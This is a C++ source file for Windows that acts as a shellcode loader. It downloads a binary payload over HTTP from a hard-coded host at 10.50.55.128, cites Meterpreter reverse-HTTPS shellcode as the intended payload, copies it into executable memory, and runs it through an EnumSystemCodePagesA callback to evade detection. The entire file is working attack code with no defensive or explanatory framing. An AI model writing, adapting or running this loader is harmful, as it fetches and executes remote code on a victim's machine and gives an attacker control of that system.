#include <iostream>
#include <Windows.h>
#include <WinInet.h>

#include "struct.h"

#pragma comment(lib, "WinInet.lib")

rstring RequestShellcode(LPCSTR ServerName, WORD ServerPort, LPCSTR Resource) {

	rstring data;

	LPCSTR useragent = "InternetShell/1.0";
	LPCSTR pszAcceptTypes = "application/octet-stream";

	HINTERNET hInternet = InternetOpenA(useragent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet) {
		printf("-- Failed to create an InternetOpenA handle\n");
		InternetCloseHandle(hInternet);
	}
	printf("++ Success got InternetOpenA handle\n");

	HINTERNET hConnect = InternetConnectA(hInternet, ServerName, ServerPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (!hConnect) {
		printf("-- Failed to create InternetConnectA handle\n");
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
	}
	printf("++ Success got InternetConnectA handle\n");

	HINTERNET hHttp = HttpOpenRequestA(hConnect, NULL, Resource, NULL, NULL, &pszAcceptTypes, (INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE), NULL);
	if (!hHttp) {
		printf("-- Failed to create HttpOpenRequestA handle\n");
		InternetCloseHandle(hHttp);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
	}
	printf("++ Success got HttpOpenRequestA handle\n");
	
	if (!HttpSendRequestA(hHttp, NULL, 0, NULL, 0)) {
		printf("-- Failed requesting resource from target\n");
		InternetCloseHandle(hHttp);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
	}
	printf("++ Success got HttpSendRequestA handle\n");

	// This is extremely large buffer
	// Example: Can hold windows/x64/meterpreter_reverse_https shellcode
	char szBuffer[256000];
	DWORD dwRead;

	if (!InternetReadFile(hHttp, szBuffer, sizeof(szBuffer), &dwRead)) {
		InternetCloseHandle(hHttp);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
	}

	InternetCloseHandle(hHttp);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);

	data.Buffer = szBuffer;
	data.Length = dwRead;

	return data;
}


int main(void) {

	rstring data = RequestShellcode("10.50.55.128", 80, "/test.bin");

	char* sc = data.Buffer;
	DWORD scSize = data.Length;
	printf("** Shellcode size: %d\n", scSize);

	void* ptr = VirtualAlloc(NULL, scSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("** Memory pointer: %p\n", ptr);

	memmove(ptr, sc, scSize);
	
	EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)ptr, 0);
}